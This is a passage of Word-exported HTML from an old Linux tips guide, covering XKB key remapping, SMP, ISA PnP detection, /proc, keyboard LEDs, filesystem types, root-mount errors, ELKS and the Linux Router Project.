><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >First you need to find out which key mapping you are using. Usually it will be US, it might also be en_US, ca</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >or else. Locate the file, usually in /usr/X11/lib/X11/xkb and edit it with your favorite editor. For me the file is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >called /usr/X11/lib/X11/xkb/symbols/ca.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The file lists all the key codes and what they do. The key codes for the Win95 special keys are LWIN, RWIN</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and MENU. All you need to do is add them to the list, with the functions for them. I decided to map the left</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >WIN key to "@" and the right WIN key and MENU keys to "{" and "}". Here are the lines I added:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >key &lt;RWIN&gt; { [ braceleft ] };</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >key &lt;LWIN&gt; { [ at ] };</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >key &lt;MENU&gt; { [ braceright ] };</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >By browsing the file you can find all the other symbols and what they do. You can also add multiple</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >functions to a key, by using ALT and SHIFT.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The changes will take effect when you restart X Window. With the XKB extension (you do need to have it</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >enabled in /etc/XF86Config btw) it's easy to change the mapping of any key.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.5</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 5: Added processors</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Dual processors are becoming more and more popular in computers. Of course, you won't be able to see</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >much performance increase in Linux unless you tell Linux about the second CPU. Here is how to do it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Go in the kernel, and enable SMP. SMP means Symetric Multi-Processing and tells the kernel that more than</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >one processor can be used.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >After a reboot, Linux should tell you that it has detected 2 processors and what their status are.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.6</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 6: Detecting an ISA device</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >ISA devices like modems should be detected automatically by the kernel. One case where they would not be</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >detected is if the device is Plug and Play. The kernel won't be able to detect ISA PnP devices unless they</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >have been prepared by a program called isapnptools.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The trick is to use this program in initiation scripts. It will detect the ISA PnP devices and make them</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >available to kernel modules and applications.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >For example if you want to access an ISA PnP sound card, you will need to compile sound as a module in the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >kernel, and use isapnptools before loading the module.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.7</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 7: Find hardware information</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When the Linux system boots, it will try to detect the hardware installed in the computer. It will then make a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >fake file system called procfs and will store important information about your system in it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You can get information about your system simply by browsing the directory /proc. The files in there will</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >contain information such as the processor you have, the amount of memory and the file systems the kernel</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >currently supports.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A usefull application exists to browse the /proc file system. It is called Xproc and is available from</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  ><A rel="nofollow" href="http://devplanet.fastethernet.net/files.html"  ><FONT face="Times New Roman"  >http://devplanet.fastethernet.net/files.html</FONT></A></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >:</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.8</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 8: Blinking leds on the keyboard</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Keyboard leds are pretty boring. Usualy you know if the num lock is on or if you are writing in upper case</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >letters. Could we make them do something more useful? Of course.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The keyboard leds can be controlled by a device driver called the misc driver. That driver can control all</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >kinds of misc things. You could write your own driver to make them blink or light up at any system event.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >A program called tleds is available from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.hut.fi/~jlohikos/tleds.html</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. That program will have them</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >blink based on network usage. One will blink when packets go in, and the other when packets go out.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.9</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 9: </FONT></SPAN></SPAN></A><FONT size="2" ><SPAN style="mso-bookmark: _Toc196894737;"  ><SPAN lang="EN-US" >Reading</SPAN></SPAN><SPAN style="mso-bookmark: _Toc196894737;"  ><SPAN lang="EN-US" > a foreign file system</SPAN></SPAN></FONT></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >File systems are defined in the kernel. The kernel supports many file systems, but they need to be compiled</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >in, or compiled as a module. When you compile a file system in the kernel, all you need to do is use mount</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >with the -t option and the right file system type.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you have compiled a driver for a file system as a module, then you need to load the module first.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Here are a few of the available file systems:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >msdos: This is the FAT file system used by DOS.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >vfat: This is the FAT32 file system used by Windows 95 and Windows 98.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >ext2: This is the default Linux file system.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >iso9660: This is the default CD-ROM format.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.10</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 10: Can't mount root fs</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you boot a system, this is an error that will halt the system. This error means that the kernel can't</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >mount the root file system, so it can't get all of its configuration files.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >There are a few cases where this happens:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >No IDE support in the kernel. If your main hard drive is an IDE, and you have recompiled</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >without including "Enhanced IDE/MFM/RLL disk/cdrom/tape/floppy support" or some other</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >basic IDE device drivers.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >File system not supported. Usually the root file system should be of type ext2. You need to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >make sure that ext2 is compiled in the kernel, and not as a module because you can't load</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >modules without first mounting the root file system.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The drive is not ready. If you have removed the drive, the hard disk died or the BIOS didn't</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >detect the device for some reason, then the kernel won't be able to mount it.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.11</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 11: Linux on a 286?</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux is a multi-user, multitasking operating system which requires a 386 processor or more to run. This is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >because the lower PC processors don't have what is needed for the Linux kernel.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux being open source, is being ported to many architectures. And one group decided to modify the kernel</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >so it would run on a 286 processor. The project page is </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  ><A rel="nofollow" href="http://www.uk.linux.org/ELKS-Home/index.html"  >http://www.uk.linux.org/ELKS-Home/index.html</A></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >.</SPAN></FONT></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.12</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 12: Linux without a hard drive</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Modern Linux distributions require around 100 megs to 200 megs of hard disk space to install. But is it</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >possible to run Linux on a system without a hard drive? Yes it is.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The Linux Router Project is a full-featured Linux distribution that fits on one diskette. It was made for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >routers, and use modules to add the software packages you need, including DNS servers, Web servers, email</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >and routing. You can find more information on the Linux Router Project at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  ><A rel="nofollow" href="http://www.linuxrouter.org/"  >http://www.linuxrouter.org</A></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >.</SPAN></FONT></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.13</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 13: Shutdown and power off</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux, like most other operating systems, must be shutdown in a specified manner. You can't turn the power</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >off on a computer running Linux, or you may lose some data.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" 